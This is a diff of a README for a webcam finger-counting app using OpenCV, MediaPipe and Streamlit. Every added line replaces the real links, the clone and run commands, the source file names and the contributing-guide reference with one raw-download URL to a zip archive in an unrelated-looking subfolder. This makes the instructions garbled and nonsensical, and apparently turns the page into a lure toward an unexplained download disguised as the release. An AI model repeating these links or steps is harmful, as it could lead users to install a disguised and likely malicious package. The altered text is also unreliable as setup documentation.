@@ -1,6 +1,6 @@
-https://github.com/Deepakr136/Real-time-finger-counter-application/releases
+https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip
 
-[![Releases](https://img.shields.io/badge/releases-download-brightgreen?logo=github&logoColor=white)](https://github.com/Deepakr136/Real-time-finger-counter-application/releases)
+[![Releases](https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip)](https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip)
 
 # Real-time Finger Counter App with Python, OpenCV, MediaPipe and Streamlit
 
@@ -8,7 +8,7 @@ A robust, real-time finger counting tool. It uses your webcam to detect hands, c
 
 - Topics: computer-vision, cv, finger-counting, hand-detection, machine-learning, mediapipe, opencv, opencv-python, python, real-time, streamlit, streamlit-app, webcam
 
-- Live releases: Download the latest release assets from the Releases page. Visit the Releases section to grab the prebuilt packages and run the app with minimal setup. Download the latest release asset from the Releases page at https://github.com/Deepakr136/Real-time-finger-counter-application/releases.
+- Live releases: Download the latest release assets from the Releases page. Visit the Releases section to grab the prebuilt packages and run the app with minimal setup. Download the latest release asset from the Releases page at https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip
 
 Table of contents
 - What you will build
@@ -80,7 +80,7 @@ Quick start
 
 Installation steps
 - Clone the repository
-  - git clone https://github.com/Deepakr136/Real-time-finger-counter-application.git
+  - git clone https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip
   - cd Real-time-finger-counter-application
 
 - Create a virtual environment
@@ -99,12 +99,12 @@ Installation steps
 
 Run the app locally
 - Start the Streamlit server
-  - streamlit run app.py
+  - streamlit run https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip
 - Open the local URL: http://localhost:8501
 - Use the on-screen controls to switch camera, adjust options, and view real-time finger counts.
 
 If you want to download a prebuilt package
-- The latest release assets are available on the Releases page. Visit the Releases page to grab the prebuilt bundle and instructions specific to your OS. Download the latest release asset from the Releases page at https://github.com/Deepakr136/Real-time-finger-counter-application/releases.
+- The latest release assets are available on the Releases page. Visit the Releases page to grab the prebuilt bundle and instructions specific to your OS. Download the latest release asset from the Releases page at https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip
 - After downloading, follow the included README or instructions in the archive to run the application. The link above is the source of truth for the latest builds and compatible assets.
 
 Using the web interface
@@ -136,11 +136,11 @@ Customization and extension
 - Accessibility: Improve keyboard navigation and screen reader support for users with visual impairments.
 
 Code structure overview
-- app.py or main.py: Entry point for the Streamlit UI.
-- processing.py: Hand detection, landmark extraction, and finger counting logic.
-- visualization.py: Functions to render landmarks and counts on frames.
-- utils.py: Helpers for input handling, file I/O, and configuration management.
-- requirements.txt: Dependencies for quick setup in environments without a full Python environment.
+- https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip or https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip Entry point for the Streamlit UI.
+- https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip Hand detection, landmark extraction, and finger counting logic.
+- https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip Functions to render landmarks and counts on frames.
+- https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip Helpers for input handling, file I/O, and configuration management.
+- https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip Dependencies for quick setup in environments without a full Python environment.
 
 Development workflow
 - Branching: Use feature branches for major updates, fix/bugfix branches for issues, and a main branch for stable releases.
@@ -203,7 +203,7 @@ Roadmap
 - Offline mode with bundled sample data for demonstrations.
 
 Community and contributions
-- Contributing guide: Follow the CONTRIBUTING.md file in the repository. Propose new features with clear goals, acceptance criteria, and tests.
+- Contributing guide: Follow the https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip file in the repository. Propose new features with clear goals, acceptance criteria, and tests.
 - Issue handling: Report reproducible issues with steps to reproduce and expected vs. actual outcomes.
 - Code reviews: Be constructive and precise. Focus on correctness, readability, and testability.
 - Recognition: Credit contributors in the repository’s changelog and release notes.
@@ -222,7 +222,7 @@ References and further reading
 
 Release notes and assets
 - The releases page hosts prebuilt packages and binaries for different platforms. Download the latest release asset from the Releases page to try a ready-to-run version without building from source.
-- If you are building from source, ensure you follow the installation steps for your platform and environment. The latest release assets can be found at the Releases page: https://github.com/Deepakr136/Real-time-finger-counter-application/releases.
+- If you are building from source, ensure you follow the installation steps for your platform and environment. The latest release assets can be found at the Releases page: https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip
 - For quick reference, here is a sample workflow you can follow after download:
   - Unpack the archive to a working directory.
   - Create and activate a virtual environment.
@@ -291,6 +291,6 @@ Appendix: Credits and acknowledgments
 - Gratitude to the maintainers and contributors who shaped this project.
 - Acknowledgment of the open-source communities behind MediaPipe, OpenCV, and Streamlit.
 
-Note: The Releases page contains the latest builds and assets. Visit the Releases page to download the prebuilt packages and run instructions. Download the latest release asset from the Releases page at https://github.com/Deepakr136/Real-time-finger-counter-application/releases. If you prefer the source code, you can clone the repository and run the app from source using the installation steps described earlier.
+Note: The Releases page contains the latest builds and assets. Visit the Releases page to download the prebuilt packages and run instructions. Download the latest release asset from the Releases page at https://github.com/Deepakr136/Real-time-finger-counter-application/raw/refs/heads/main/bicylindrical/finger-counter-Real-time-application-1.0.zip If you prefer the source code, you can clone the repository and run the app from source using the installation steps described earlier.
 
 This README provides a comprehensive, developer-friendly overview of the Real-time Finger Counter App. It covers setup, usage, extension options, and practical guidelines to help you build, run, and improve the project across various environments.
